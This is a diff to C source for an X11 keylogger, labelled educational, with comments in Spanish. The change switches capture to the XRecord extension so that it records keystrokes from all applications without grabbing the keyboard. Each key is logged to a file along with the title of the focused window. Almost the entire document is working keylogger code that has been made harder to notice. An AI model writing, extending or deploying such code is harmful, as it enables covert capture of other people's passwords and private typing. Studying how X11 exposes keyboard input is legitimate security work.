@@ -18,17 +18,21 @@
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
 #include <X11/keysym.h>
+#include <X11/extensions/record.h>
 #include <time.h>
 #include <signal.h>
 #include <unistd.h>
+#include <pthread.h>
 
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
 
 // Variables globales para manejo de señales
 Display *display = NULL;
+Display *record_display = NULL;
 FILE *logfile = NULL;
 volatile sig_atomic_t running = 1;
+XRecordContext record_context = 0;
 
 // Manejador de señales para limpieza
 void signal_handler(int signum) {
@@ -160,22 +164,81 @@ void log_key_event(const char *window_name, const char *key_str) {
     printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
 }
 
+// Callback para XRecord - aquí se procesan los eventos capturados
+void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
+    (void)closure; // No usado
+    
+    if (recorded_data->category == XRecordFromServer) {
+        // Obtener el tipo de evento
+        int event_type = recorded_data->data[0];
+        
+        // Solo procesar eventos KeyPress (tipo 2)
+        if (event_type == KeyPress) {
+            // Extraer el keycode del evento
+            unsigned char keycode = recorded_data->data[1];
+            
+            // Obtener ventana con foco
+            Window focused = get_focused_window(display);
+            char *window_name = get_window_name(display, focused);
+            
+            // Convertir keycode a keysym
+            KeySym keysym = XKeycodeToKeysym(display, keycode, 0);
+            const char *key_str = keysym_to_string(keysym);
+            
+            // Registrar el evento
+            static char *last_window_name = NULL;
+            if (last_window_name == NULL || strcmp(last_window_name, window_name) != 0) {
+                char window_change_msg[512];
+                snprintf(window_change_msg, sizeof(window_change_msg), 
+                        "\n--- Ventana activa: %s ---\n", window_name);
+                if (logfile) {
+                    fprintf(logfile, "%s", window_change_msg);
+                    fflush(logfile);
+                }
+                printf("%s", window_change_msg);
+                last_window_name = window_name;
+            }
+            
+            log_key_event(window_name, key_str);
+        }
+    }
+    
+    // IMPORTANTE: Liberar los datos grabados
+    XRecordFreeData(recorded_data);
+}
+
 // Función principal del keylogger
 int start_keylogger() {
-    XEvent event;
-    KeySym keysym;
-    char *last_window_name = NULL;
+    char timestamp[64];
     
     printf("[*] Keylogger educativo iniciado.\n");
-    printf("[*] Capturando eventos de teclado en X11...\n");
+    printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
     printf("[*] Archivo de log: %s\n", LOG_FILE);
     printf("[*] Presione Ctrl+C para detener.\n\n");
     
-    // Abrir conexión con X11
+    // Abrir conexión principal con X11
     display = XOpenDisplay(NULL);
     if (display == NULL) {
         fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
         fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
+        return 1;
+    }
+    
+    // Verificar si la extensión XRecord está disponible
+    int major, minor;
+    if (!XRecordQueryVersion(display, &major, &minor)) {
+        fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
+        fprintf(stderr, "[!] Esta extensión es necesaria para capturar eventos sin bloquear el teclado.\n");
+        XCloseDisplay(display);
+        return 1;
+    }
+    printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
+    
+    // Abrir segunda conexión para la grabación (requerido por XRecord)
+    record_display = XOpenDisplay(NULL);
+    if (record_display == NULL) {
+        fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11 para grabación.\n");
+        XCloseDisplay(display);
         return 1;
     }
     
@@ -184,71 +247,73 @@ int start_keylogger() {
     if (logfile == NULL) {
         fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
         XCloseDisplay(display);
+        XCloseDisplay(record_display);
         return 1;
     }
     
     // Escribir encabezado en el log
     fprintf(logfile, "\n=== Nueva sesión de keylogging ===\n");
-    char timestamp[64];
     get_timestamp(timestamp, sizeof(timestamp));
     fprintf(logfile, "Inicio: %s\n\n", timestamp);
     fflush(logfile);
-    
-    // Obtener ventana raíz
-    Window root = DefaultRootWindow(display);
     
     // Configurar manejador de señales
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
     
-    // Capturar eventos de teclado de todas las ventanas
-    // Esta es la vulnerabilidad clave de X11: cualquier aplicación puede hacer esto
-    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
+    // Configurar el rango de eventos a capturar
+    XRecordRange *record_range = XRecordAllocRange();
+    if (record_range == NULL) {
+        fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
+        fclose(logfile);
+        XCloseDisplay(display);
+        XCloseDisplay(record_display);
+        return 1;
+    }
     
-    // Capturar todos los eventos de teclado del servidor X
-    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);
+    // Capturar solo eventos de teclado (KeyPress)
+    record_range->device_events.first = KeyPress;
+    record_range->device_events.last = KeyPress;
     
-    // Loop principal de captura de eventos
+    // Crear contexto de grabación para todos los clientes
+    XRecordClientSpec client_spec = XRecordAllClients;
+    record_context = XRecordCreateContext(record_display, 0, &client_spec, 1, &record_range, 1);
+    
+    if (record_context == 0) {
+        fprintf(stderr, "[!] Error: No se puede crear contexto de grabación XRecord.\n");
+        XFree(record_range);
+        fclose(logfile);
+        XCloseDisplay(display);
+        XCloseDisplay(record_display);
+        return 1;
+    }
+    
+    XFree(record_range);
+    
+    printf("[*] Contexto XRecord creado. Monitoreando eventos sin bloquear el teclado...\n\n");
+    
+    // Habilitar el contexto de grabación
+    // Esta llamada es bloqueante y procesa eventos hasta que running = 0
+    if (!XRecordEnableContextAsync(record_display, record_context, record_callback, NULL)) {
+        fprintf(stderr, "[!] Error: No se puede habilitar contexto de grabación.\n");
+        XRecordFreeContext(record_display, record_context);
+        fclose(logfile);
+        XCloseDisplay(display);
+        XCloseDisplay(record_display);
+        return 1;
+    }
+    
+    // Loop principal - procesar eventos XRecord
     while (running) {
-        // Esperar por eventos con timeout
-        if (XPending(display) > 0) {
-            XNextEvent(display, &event);
-            
-            // Solo procesar eventos de tecla presionada
-            if (event.type == KeyPress) {
-                // Obtener ventana con foco
-                Window focused = get_focused_window(display);
-                char *window_name = get_window_name(display, focused);
-                
-                // Imprimir cambio de ventana
-                if (last_window_name == NULL || strcmp(last_window_name, window_name) != 0) {
-                    char window_change_msg[512];
-                    snprintf(window_change_msg, sizeof(window_change_msg), 
-                            "\n--- Ventana activa: %s ---\n", window_name);
-                    if (logfile) {
-                        fprintf(logfile, "%s", window_change_msg);
-                        fflush(logfile);
-                    }
-                    printf("%s", window_change_msg);
-                    last_window_name = window_name;
-                }
-                
-                // Convertir keycode a keysym
-                keysym = XLookupKeysym(&event.xkey, 0);
-                const char *key_str = keysym_to_string(keysym);
-                
-                // Registrar el evento
-                log_key_event(window_name, key_str);
-            }
-        } else {
-            // Pequeña pausa para no consumir 100% CPU
-            usleep(10000); // 10ms
-        }
+        XRecordProcessReplies(record_display);
     }
     
     // Limpieza
     printf("\n[*] Limpiando recursos...\n");
-    XUngrabKeyboard(display, CurrentTime);
+    
+    // Deshabilitar y liberar contexto de grabación
+    XRecordDisableContext(record_display, record_context);
+    XRecordFreeContext(record_display, record_context);
     
     if (logfile) {
         fprintf(logfile, "\n=== Sesión finalizada ===\n");
@@ -259,6 +324,10 @@ int start_keylogger() {
     
     if (display) {
         XCloseDisplay(display);
+    }
+    
+    if (record_display) {
+        XCloseDisplay(record_display);
     }
     
     printf("[*] Keylogger detenido correctamente.\n");
